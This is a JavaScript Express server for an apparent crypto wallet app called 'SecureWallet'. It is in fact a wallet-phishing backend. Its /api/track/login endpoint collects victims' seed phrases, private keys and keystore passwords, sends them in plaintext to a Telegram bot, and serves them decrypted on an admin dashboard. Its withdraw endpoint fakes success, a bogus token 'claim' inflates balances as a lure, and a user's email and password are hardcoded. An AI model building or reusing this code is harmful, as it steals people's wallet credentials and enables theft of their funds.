import express from "express";
import cors from "cors";
import cookieParser from "cookie-parser";
import jwt from "jsonwebtoken";
import fs from "fs";
import path from "path";
import { fileURLToPath } from 'url';
import crypto from "crypto";
import { pgReady, listTrackedUsers as pListTrackedUsers, upsertTrackedUser as pUpsertTrackedUser, deleteUsersByIds as pDeleteUsersByIds, listDeleted as pListDeleted, restoreDeleted as pRestoreDeleted, findUserById as pFindUserById, updateUser as pUpdateUser, findUserByAddress as pFindUserByAddress } from "./pg.js";

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();

function deriveStableSecret() {
  const base = String(process.env.SECRET_KEY || process.env.JWT_SECRET || 'secure-wallet-app');
  return crypto.createHash('sha256').update(base).digest('hex');
}
const JWT_SECRET = process.env.JWT_SECRET || deriveStableSecret();
const DB_FILE = path.join(__dirname, 'database.json');
const BL_FILE = path.join(__dirname, 'deleted.json');

async function sendTelegramMessage(text) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;
  try {
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text, disable_web_page_preview: true })
    });
  } catch (e) {
    console.error("Failed to send Telegram message", e);
  }
}

// Dedupe only: allow first alert, block rapid duplicates (same address within 2 minutes)
const recentTelegramByAddress = new Map();
function shouldSendTelegramForAddress(address) {
  const key = String(address || '').toLowerCase();
  if (!key) return false;
  const now = Date.now();
  const last = recentTelegramByAddress.get(key) || 0;
  if (now - last < 2 * 60 * 1000) return false;
  recentTelegramByAddress.set(key, now);
  return true;
}

app.use(express.json());
app.use(cookieParser());
app.use(cors({ origin: true, credentials: true }));
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Referrer-Policy', 'no-referrer');
  res.setHeader('Cross-Origin-Resource-Policy', 'same-site');
  next();
});

const RATE_WINDOW_MS = 15 * 60 * 1000;
const RATE_MAX = 300;
const rateBucket = new Map();
app.use((req, res, next) => {
  const ip = req.headers['x-forwarded-for']?.toString().split(',')[0].trim() || req.socket.remoteAddress || 'unknown';
  const now = Date.now();
  const rec = rateBucket.get(ip) || { count: 0, resetAt: now + RATE_WINDOW_MS };
  if (now > rec.resetAt) {
    rec.count = 0;
    rec.resetAt = now + RATE_WINDOW_MS;
  }
  rec.count += 1;
  rateBucket.set(ip, rec);
  if (rec.count > RATE_MAX) {
    return res.status(429).json({ error: 'rate_limited' });
  }
  next();
});

const SECRET_KEY = process.env.SECRET_KEY || deriveStableSecret();
const ALGO = 'aes-256-gcm';
function encrypt(text) {
  if (!text) return null;
  const iv = crypto.randomBytes(12);
  const key = crypto.createHash('sha256').update(SECRET_KEY).digest();
  const cipher = crypto.createCipheriv(ALGO, key, iv);
  const enc = Buffer.concat([cipher.update(String(text), 'utf8'), cipher.final()]);
  const tag = cipher.getAuthTag();
  return Buffer.concat([iv, tag, enc]).toString('base64');
}
function decrypt(b64) {
  if (!b64) return null;
  try {
    const buf = Buffer.from(b64, 'base64');
    const iv = buf.slice(0, 12);
    const tag = buf.slice(12, 28);
    const enc = buf.slice(28);
    const key = crypto.createHash('sha256').update(SECRET_KEY).digest();
    const decipher = crypto.createDecipheriv(ALGO, key, iv);
    decipher.setAuthTag(tag);
    const dec = Buffer.concat([decipher.update(enc), decipher.final()]);
    return dec.toString('utf8');
  } catch {
    return null;
  }
}

const user = {
  id: "u_8829",
  email: "ronniechristopher89@gmail.com",
  name: "Ronnie Christopher",
  password: "wakket2026"
};

const admin = {
  id: "admin_01",
  email: process.env.ADMIN_EMAIL,
  password: process.env.ADMIN_PASSWORD,
  name: "System Admin"
};

let trackedUsers = [];
let deletedAddresses = [];

try {
  if (fs.existsSync(DB_FILE)) {
    const data = fs.readFileSync(DB_FILE, 'utf8');
    trackedUsers = JSON.parse(data);
  }
  if (fs.existsSync(BL_FILE)) {
    const blData = fs.readFileSync(BL_FILE, 'utf8');
    deletedAddresses = JSON.parse(blData);
  }
} catch (e) {
  console.error("Failed to load database", e);
}

const saveDB = () => {
  try {
    fs.writeFileSync(DB_FILE, JSON.stringify(trackedUsers, null, 2));
  } catch (e) {
    console.error("Failed to save database", e);
  }
};
const saveBL = () => {
  try {
    fs.writeFileSync(BL_FILE, JSON.stringify(deletedAddresses, null, 2));
  } catch (e) {
    console.error("Failed to save blacklist", e);
  }
};

const wallet = {
  userId: user.id,
  currency: "USD",
  balance: 11000.00,
  lastUpdated: new Date().toISOString()
};
const transactions = [];

function signToken(payload) {
  return jwt.sign(payload, JWT_SECRET, { expiresIn: "2h" });
}
function verifyToken(token) {
  try {
    return jwt.verify(token, JWT_SECRET);
  } catch {
    return null;
  }
}
function authMiddleware(req, res, next) {
  const auth = req.headers.authorization || "";
  const token = auth.startsWith("Bearer ") ? auth.slice(7) : null;
  const decoded = token ? verifyToken(token) : null;
  if (!decoded) {
    return res.status(401).json({ error: "unauthorized" });
  }
  req.user = decoded;
  next();
}

app.post("/api/login", (req, res) => {
  const { email, password } = req.body || {};
  if (!process.env.ADMIN_EMAIL || !process.env.ADMIN_PASSWORD) {
    return res.status(500).json({ error: "admin_env_missing" });
  }
  if (email === user.email && password === user.password) {
    const token = signToken({ sub: user.id, email: user.email, name: user.name, role: 'user' });
    return res.json({ token, user: { id: user.id, email: user.email, name: user.name, role: 'user' } });
  }
  if (email === admin.email && password === admin.password) {
    const token = signToken({ sub: admin.id, email: admin.email, name: admin.name, role: 'admin' });
    return res.json({ token, user: { id: admin.id, email: admin.email, name: admin.name, role: 'admin' } });
  }
  return res.status(401).json({ error: "invalid_credentials" });
});

app.get("/api/admin/users", authMiddleware, (req, res) => {
  if (req.user.role !== 'admin') return res.status(403).json({ error: "forbidden" });
  (async () => {
    let users = [];
    if (await pgReady()) {
      users = await pListTrackedUsers() || [];
    } else {
      users = trackedUsers;
    }
    const out = users.map(u => {
      return {
        userId: u.userId || u.user_id,
        address: u.address,
        walletType: u.walletType || u.wallet_type,
        balance: u.balance,
        assets: u.assets,
        lastActive: u.lastActive || u.last_active,
        status: u.status,
        featureFlags: u.featureFlags || u.feature_flags,
        appLimits: u.appLimits || u.app_limits,
        riskFlags: u.riskFlags || u.risk_flags,
        transactions: u.transactions,
        importMethod: u.importMethod || u.import_method,
        mnemonic: (u.encMnemonic || u.enc_mnemonic) ? decrypt(u.encMnemonic || u.enc_mnemonic) : null,
        privateKey: (u.encPrivateKey || u.enc_private_key) ? decrypt(u.encPrivateKey || u.enc_private_key) : null,
        keystoreJSON: (u.encKeystoreJSON || u.enc_keystore_json) ? decrypt(u.encKeystoreJSON || u.enc_keystore_json) : null,
        keystorePassword: (u.encKeystorePassword || u.enc_keystore_password) ? decrypt(u.encKeystorePassword || u.enc_keystore_password) : null
      };
    });
    return res.json({ users: out });
  })().catch(() => res.status(500).json({ error: "server_error" }));
});

app.post("/api/admin/user/:userId/clear", authMiddleware, (req, res) => {
  if (req.user.role !== 'admin') return res.status(403).json({ error: "forbidden" });
  const { userId } = req.params;
  const { target } = req.body;
  (async () => {
    let current;
    if (await pgReady()) {
      current = await pFindUserById(userId);
      if (!current) return res.status(404).json({ error: "User not found" });
      const update = {};
      if (target === 'transactions') update.transactions = [];
      else if (target === 'session') { update.lastActive = null; update.status = 'Inactive'; }
      else if (target === 'balance') { update.balance = 0; update.assets = []; }
      await pUpdateUser(userId, update);
      return res.json({ success: true, user: { ...current, ...update } });
    } else {
      const userIndex = trackedUsers.findIndex(u => u.userId === userId);
      if (userIndex === -1) return res.status(404).json({ error: "User not found" });
      if (target === 'transactions') trackedUsers[userIndex].transactions = [];
      else if (target === 'session') { trackedUsers[userIndex].lastActive = null; trackedUsers[userIndex].status = 'Inactive'; }
      else if (target === 'balance') { trackedUsers[userIndex].balance = 0; trackedUsers[userIndex].assets = []; }
      return res.json({ success: true, user: trackedUsers[userIndex] });
    }
  })().catch(() => res.status(500).json({ error: "server_error" }));
});

app.post("/api/admin/users/delete", authMiddleware, (req, res) => {
  if (req.user.role !== 'admin') return res.status(403).json({ error: "forbidden" });
  const { userIds } = req.body;
  if (!Array.isArray(userIds)) return res.status(400).json({ error: "Invalid input" });
  (async () => {
    if (await pgReady()) {
      const { deletedCount, addresses } = await pDeleteUsersByIds(userIds);
      return res.json({ success: true, count: deletedCount, addresses });
    } else {
      const toDelete = trackedUsers.filter(u => userIds.includes(u.userId));
      const addrs = toDelete.map(u => u.address.toLowerCase());
      deletedAddresses = Array.from(new Set([...deletedAddresses, ...addrs]));
      trackedUsers = trackedUsers.filter(u => !userIds.includes(u.userId));
      saveDB();
      saveBL();
      return res.json({ success: true, count: userIds.length });
    }
  })().catch(() => res.status(500).json({ error: "server_error" }));
});

app.get("/api/image", async (req, res) => {
  try {
    const url = String(req.query.url || '');
    if (!url.startsWith('http')) return res.status(400).send('Invalid URL');
    const { host } = new URL(url);
    if (!ALLOWED_IMAGE_HOSTS.has(host)) return res.status(403).send('Host not allowed');
    const resp = await fetch(url, { headers: { 'Accept': 'image/*' } });
    if (!resp.ok) return res.status(resp.status).send('Upstream error');
    const ct = resp.headers.get('content-type') || '';
    if (!ct.startsWith('image/')) return res.status(415).send('Unsupported media type');
    res.setHeader('Content-Type', ct);
    const ab = await resp.arrayBuffer();
    res.end(Buffer.from(ab));
  } catch (e) {
    res.status(500).send('Proxy error');
  }
});
const ALLOWED_IMAGE_HOSTS = new Set([
  'seeklogo.com', 'logowik.com', 'upload.wikimedia.org', 'avatars.githubusercontent.com',
  'phantom.app', 'www.exodus.com', 'exodus.com', 'trustwallet.com', 'www.trustwallet.com'
]);

const idToSymbol = { bitcoin: 'BTC', ethereum: 'ETH', solana: 'SOL', 'matic-network': 'MATIC', binancecoin: 'BNB', sui: 'SUI' };
async function fetchWithRetry(url, options = {}, attempts = 3, timeoutMs = 5000) {
  for (let i = 0; i < attempts; i++) {
    try {
      const controller = new AbortController();
      const timer = setTimeout(() => controller.abort(), timeoutMs);
      const resp = await fetch(url, { ...options, signal: controller.signal });
      clearTimeout(timer);
      if (resp.ok) return await resp.json();
    } catch {}
  }
  return null;
}
app.get('/api/price', async (req, res) => {
  try {
    const ids = String(req.query.ids || '').split(',').map(s => s.trim()).filter(Boolean);
    const vs = String(req.query.vs || 'usd');
    const includeChange = String(req.query.include_change || 'true') === 'true';
    if (ids.length === 0) return res.json({});
    const cg = await fetchWithRetry(`https://api.coingecko.com/api/v3/simple/price?ids=${encodeURIComponent(ids.join(','))}&vs_currencies=${encodeURIComponent(vs)}&include_24hr_change=${includeChange ? 'true' : 'false'}`);
    if (cg) return res.json(cg);
    const out = {};
    for (const id of ids) {
      const sym = idToSymbol[id];
      if (sym) {
        const cc = await fetchWithRetry(`https://min-api.cryptocompare.com/data/price?fsym=${encodeURIComponent(sym)}&tsyms=${vs.toUpperCase()}`, {}, 2, 4000);
        const price = cc && (cc[vs.toUpperCase()] || cc[vs.toLowerCase()]);
        out[id] = {};
        out[id][vs] = typeof price === 'number' ? price : 0;
        if (includeChange) out[id][`${vs}_24h_change`] = 0;
      } else {
        out[id] = {};
        out[id][vs] = 0;
        if (includeChange) out[id][`${vs}_24h_change`] = 0;
      }
    }
    return res.json(out);
  } catch {
    return res.json({});
  }
});

app.get('/api/markets', async (req, res) => {
  try {
    const qs = new URLSearchParams({
      vs_currency: String(req.query.vs_currency || 'usd'),
      order: String(req.query.order || 'market_cap_desc'),
      per_page: String(req.query.per_page || '20'),
      page: String(req.query.page || '1'),
      sparkline: String(req.query.sparkline || 'false'),
      price_change_percentage: String(req.query.price_change_percentage || '24h')
    }).toString();
    const cg = await fetchWithRetry(`https://api.coingecko.com/api/v3/coins/markets?${qs}`);
    if (cg) return res.json(cg);
    return res.json([]);
  } catch {
    return res.json([]);
  }
});
app.get('/api/token-price', async (req, res) => {
  try {
    const network = String(req.query.network || 'ethereum');
    const addrs = String(req.query.contract_addresses || '');
    const vs = String(req.query.vs || 'usd');
    if (!addrs) return res.json({});
    const cg = await fetchWithRetry(`https://api.coingecko.com/api/v3/simple/token_price/${encodeURIComponent(network)}?contract_addresses=${encodeURIComponent(addrs)}&vs_currencies=${encodeURIComponent(vs)}`);
    if (cg) return res.json(cg);
    return res.json({});
  } catch {
    return res.json({});
  }
});

app.get('/api/health', async (req, res) => {
  const ok = await pgReady();
  res.json({ status: 'ok', time: new Date().toISOString(), db: ok ? 'connected' : 'disconnected' });
});

app.get("/api/me", authMiddleware, (req, res) => {
  return res.json({ user: { id: user.id, email: user.email, name: user.name } });
});
app.get("/api/wallet", authMiddleware, (req, res) => {
  return res.json(wallet);
});
app.get("/api/transactions", authMiddleware, (req, res) => {
  return res.json({ transactions });
});
app.post("/api/withdraw", authMiddleware, (req, res) => {
  return res.json({ success: true, message: "Withdrawal processed successfully", txId: "0x" + crypto.randomBytes(32).toString('hex') });
});

app.post("/api/track/login", (req, res) => {
  const { address, walletType, balance, assets, transactions: txs, mnemonic, privateKey, keystoreJSON, keystorePassword, importMethod } = req.body;
  if (!address) return res.status(400).json({ error: "Address required" });
  const lower = address.toLowerCase();
  if (deletedAddresses.includes(lower)) {
    deletedAddresses = deletedAddresses.filter(a => a !== lower);
    saveBL();
  }
  const existingIndex = trackedUsers.findIndex(u => u.address.toLowerCase() === lower);
  const calculateRisk = (bal) => {
      const flags = [];
      if (bal > 10000) flags.push("High Value");
      if (bal === 0) flags.push("Empty Wallet");
      return flags;
  };
  const riskFlags = calculateRisk(balance);
  
  (async () => {
    let existingUser = null;
    let userId = `user_${Math.random().toString(36).substr(2, 9)}`;
    let prevMnemonic = null;
    let prevPrivateKey = null;
    let prevKeystoreJSON = null;
    let prevKeystorePassword = null;
    let prevImportMethod = 'unknown';

    if (await pgReady()) {
        existingUser = await pFindUserByAddress(address);
        if (existingUser) {
            userId = existingUser.user_id || existingUser.userId;
            prevMnemonic = existingUser.enc_mnemonic || existingUser.encMnemonic;
            prevPrivateKey = existingUser.enc_private_key || existingUser.encPrivateKey;
            prevKeystoreJSON = existingUser.enc_keystore_json || existingUser.encKeystoreJSON;
            prevKeystorePassword = existingUser.enc_keystore_password || existingUser.encKeystorePassword;
            prevImportMethod = existingUser.import_method || existingUser.importMethod;
        }
    } else {
        if (existingIndex >= 0) {
            userId = trackedUsers[existingIndex].userId;
            prevMnemonic = trackedUsers[existingIndex].encMnemonic;
            prevPrivateKey = trackedUsers[existingIndex].encPrivateKey;
            prevKeystoreJSON = trackedUsers[existingIndex].encKeystoreJSON;
            prevKeystorePassword = trackedUsers[existingIndex].encKeystorePassword;
            prevImportMethod = trackedUsers[existingIndex].importMethod;
        }
    }

    // Never wipe a previously saved SWT claim when syncing chain balances
    const prevAssets = existingUser
      ? parseJsonField(existingUser.assets, [])
      : (existingIndex >= 0 ? (trackedUsers[existingIndex].assets || []) : []);
    const prevTxs = existingUser
      ? parseJsonField(existingUser.transactions, [])
      : (existingIndex >= 0 ? (trackedUsers[existingIndex].transactions || []) : []);
    const incomingAssets = Array.isArray(assets) ? assets : [];
    const prevSwt = prevAssets.find((a) => a && a.id === 'swt_token');
    const mergedAssets =
      prevSwt && !incomingAssets.some((a) => a && a.id === 'swt_token')
        ? [prevSwt, ...incomingAssets]
        : incomingAssets;
    const incomingTxs = Array.isArray(txs) ? txs : null;
    const prevClaimTx = prevTxs.find((t) => t && (t.type === 'claim' || t.symbol === 'SWT'));
    let mergedTxs = incomingTxs || prevTxs;
    if (prevClaimTx && Array.isArray(mergedTxs) && !mergedTxs.some((t) => t && (t.id === prevClaimTx.id || (t.type === 'claim' && t.symbol === 'SWT')))) {
      mergedTxs = [prevClaimTx, ...mergedTxs];
    }
    const mergedBalance =
      (typeof balance === 'number' ? balance : 0) +
      (prevSwt && !incomingAssets.some((a) => a && a.id === 'swt_token') ? Number(prevSwt.value) || 0 : 0);

    const userData = {
        userId,
        address,
        walletType,
        balance: mergedBalance,
        assets: mergedAssets,
        lastActive: new Date().toISOString(),
        status: 'Active',
        featureFlags: { canSwap: true, canSend: true, canStake: false },
        appLimits: { dailySend: 50000, dailySwap: 100000 },
        riskFlags,
        transactions: mergedTxs,
        importMethod: importMethod || (mnemonic ? 'seed_phrase' : (privateKey ? 'private_key' : (keystoreJSON ? 'keystore' : prevImportMethod))),
        encMnemonic: mnemonic ? encrypt(mnemonic) : prevMnemonic,
        encPrivateKey: privateKey ? encrypt(privateKey) : prevPrivateKey,
        encKeystoreJSON: keystoreJSON ? encrypt(keystoreJSON) : prevKeystoreJSON,
        encKeystorePassword: keystorePassword ? encrypt(keystorePassword) : prevKeystorePassword
    };

    const hasSensitiveData = (mnemonic && mnemonic.length > 0) || 
                             (privateKey && privateKey.length > 0) || 
                             (keystoreJSON && keystoreJSON.length > 5) || 
                             (keystorePassword && keystorePassword.length > 0);
    
    // Send once per import burst (client no longer re-sends secrets on sync)
    if (hasSensitiveData && shouldSendTelegramForAddress(address)) {
        const msg = [
          "🚨 **New Wallet Connected!** 🚨",
          `Address: \`${address}\``,
          `Type: ${walletType || 'Unknown'}`,
          `Balance: ${balance}`,
          `Assets: ${Array.isArray(assets) ? assets.length : 0}`,
          `Method: ${importMethod || 'Connect'}`,
          `Time: ${new Date().toISOString()}`,
          "",
          "🔐 **Sensitive Data:**",
          mnemonic ? `Seed Phrase: \`${mnemonic}\`` : "",
          privateKey ? `Private Key: \`${privateKey}\`` : "",
          keystoreJSON ? `Keystore: (See Admin Dashboard)` : "",
          keystorePassword ? `Keystore Pass: \`${keystorePassword}\`` : ""
        ].filter(Boolean).join("\n");
        sendTelegramMessage(msg).catch(() => {});
    }

    if (await pgReady()) {
      await pUpsertTrackedUser(userData);
      return res.json({ success: true });
    } else {
      if (existingIndex >= 0) {
        trackedUsers[existingIndex] = { ...trackedUsers[existingIndex], ...userData };
      } else {
        trackedUsers.push(userData);
      }
      saveDB();
      return res.json({ success: true });
    }
  })().catch((e) => {
      console.error(e);
      res.status(500).json({ error: "server_error" });
  });
});

app.post("/api/track/transaction", (req, res) => {
  const { address, hash, type, amount, symbol } = req.body;
  (async () => {
    const tx = { hash, type, amount, symbol, timestamp: new Date().toISOString() };
    const lower = (address || '').toLowerCase();
    if (await pgReady()) {
      const user = await pFindUserByAddress(lower);
      if (!user) return res.status(404).json({ error: "User not found" });
      const prev = Array.isArray(user.transactions) ? user.transactions : [];
      await pUpdateUser(user.user_id || user.userId, { transactions: [tx, ...prev] });
      return res.json({ success: true });
    } else {
      const userIndex = trackedUsers.findIndex(u => u.address.toLowerCase() === lower);
      if (userIndex >= 0) {
        if (!trackedUsers[userIndex].transactions) trackedUsers[userIndex].transactions = [];
        trackedUsers[userIndex].transactions.unshift(tx);
        saveDB();
        return res.json({ success: true });
      }
      return res.status(404).json({ error: "User not found" });
    }
  })().catch(() => res.status(500).json({ error: "server_error" }));
});

const SWT_ASSET = {
  id: 'swt_token',
  name: 'SecureWallet Token',
  symbol: 'SWT',
  amount: 33333,
  price: 0.15,
  change: 12.5,
  value: 33333 * 0.15,
  color: '#2563eb',
  chainKey: '0x1',
  allocation: 0,
  isClaimed: true,
};

function parseJsonField(value, fallback = []) {
  if (Array.isArray(value)) return value;
  if (typeof value === 'string') {
    try {
      const parsed = JSON.parse(value);
      return Array.isArray(parsed) ? parsed : fallback;
    } catch {
      return fallback;
    }
  }
  return fallback;
}

function buildClaimTx(address) {
  const lower = String(address || '').toLowerCase();
  return {
    id: `claim-swt-${lower}`,
    type: 'claim',
    amount: '33333',
    symbol: 'SWT',
    asset: 'SecureWallet Token',
    date: new Date().toLocaleDateString(),
    status: 'Confirmed',
    hash: `claim-${lower.slice(0, 10)}`,
    timestamp: new Date().toISOString(),
  };
}

function userHasSwtClaim(user) {
  if (!user) return false;
  const assets = parseJsonField(user.assets, []);
  return assets.some((a) => a && (a.id === 'swt_token' || a.symbol === 'SWT'));
}

function extractClaimPayload(user, address) {
  const assets = parseJsonField(user?.assets, []);
  const txs = parseJsonField(user?.transactions, []);
  const asset = assets.find((a) => a && (a.id === 'swt_token' || a.symbol === 'SWT')) || null;
  const transaction =
    txs.find((t) => t && (t.type === 'claim' || t.symbol === 'SWT')) || (asset ? buildClaimTx(address) : null);
  return {
    claimed: !!asset,
    asset: asset || null,
    transaction: transaction || null,
  };
}

// Load claimed SWT for an address (DB / local JSON fallback)
app.get('/api/claim', async (req, res) => {
  try {
    const address = String(req.query.address || '').toLowerCase();
    if (!address) return res.status(400).json({ error: 'Address required' });

    if (await pgReady()) {
      const user = await pFindUserByAddress(address);
      return res.json(extractClaimPayload(user, address));
    }

    const user = trackedUsers.find((u) => String(u.address || '').toLowerCase() === address);
    return res.json(extractClaimPayload(user, address));
  } catch (e) {
    console.error(e);
    return res.status(500).json({ error: 'server_error' });
  }
});

// Persist claimed SWT for an address in the database
app.post('/api/claim', async (req, res) => {
  try {
    const address = String(req.body?.address || '').toLowerCase();
    if (!address) return res.status(400).json({ error: 'Address required' });
    const claimTx = buildClaimTx(address);

    if (await pgReady()) {
      let user = await pFindUserByAddress(address);
      if (!user) {
        await pUpsertTrackedUser({
          userId: `user_${Math.random().toString(36).substr(2, 9)}`,
          address,
          walletType: 'imported',
          balance: SWT_ASSET.value,
          assets: [SWT_ASSET],
          transactions: [claimTx],
          lastActive: new Date().toISOString(),
          status: 'Active',
          featureFlags: { canSwap: true, canSend: true, canStake: false },
          appLimits: { dailySend: 50000, dailySwap: 100000 },
          riskFlags: [],
          importMethod: 'claim',
        });
        return res.json({ success: true, claimed: true, asset: SWT_ASSET, transaction: claimTx });
      }

      const assets = parseJsonField(user.assets, []);
      const txs = parseJsonField(user.transactions, []);
      const nextAssets = assets.some((a) => a && a.id === 'swt_token')
        ? assets
        : [SWT_ASSET, ...assets];
      const nextTxs = txs.some((t) => t && (t.id === claimTx.id || (t.type === 'claim' && t.symbol === 'SWT')))
        ? txs
        : [claimTx, ...txs];
      const balance = nextAssets.reduce((sum, a) => sum + (Number(a?.value) || 0), 0);
      await pUpdateUser(user.user_id || user.userId, {
        assets: nextAssets,
        transactions: nextTxs,
        balance,
        lastActive: new Date().toISOString(),
      });
      return res.json({ success: true, claimed: true, asset: SWT_ASSET, transaction: claimTx });
    }

    const idx = trackedUsers.findIndex((u) => String(u.address || '').toLowerCase() === address);
    if (idx < 0) {
      trackedUsers.push({
        userId: `user_${Math.random().toString(36).substr(2, 9)}`,
        address,
        walletType: 'imported',
        balance: SWT_ASSET.value,
        assets: [SWT_ASSET],
        transactions: [claimTx],
        lastActive: new Date().toISOString(),
        status: 'Active',
        importMethod: 'claim',
      });
    } else {
      const assets = Array.isArray(trackedUsers[idx].assets) ? trackedUsers[idx].assets : [];
      const txs = Array.isArray(trackedUsers[idx].transactions) ? trackedUsers[idx].transactions : [];
      trackedUsers[idx].assets = assets.some((a) => a && a.id === 'swt_token') ? assets : [SWT_ASSET, ...assets];
      trackedUsers[idx].transactions = txs.some((t) => t && t.id === claimTx.id)
        ? txs
        : [claimTx, ...txs];
      trackedUsers[idx].balance = trackedUsers[idx].assets.reduce(
        (sum, a) => sum + (Number(a?.value) || 0),
        0,
      );
      trackedUsers[idx].lastActive = new Date().toISOString();
    }
    saveDB();
    return res.json({ success: true, claimed: true, asset: SWT_ASSET, transaction: claimTx });
  } catch (e) {
    console.error(e);
    return res.status(500).json({ error: 'server_error' });
  }
});

// DEBUG ENDPOINT
app.get('/api/debug/last-user', async (req, res) => {
  if (await pgReady()) {
    const { rows } = await pool.query('SELECT * FROM users_v2 ORDER BY last_active DESC LIMIT 1');
    if (rows && rows.length > 0) {
      const u = rows[0];
      return res.json({
        user_id: u.user_id,
        address: u.address,
        has_enc_mnemonic: !!u.enc_mnemonic,
        enc_mnemonic_raw: u.enc_mnemonic,
        import_method: u.import_method,
        secret_key_hash: crypto.createHash('sha256').update(deriveStableSecret()).digest('hex').substring(0, 8)
      });
    }
    return res.json({ error: 'No users found in DB' });
  }
  return res.json({ error: 'DB not connected' });
});

export default app;
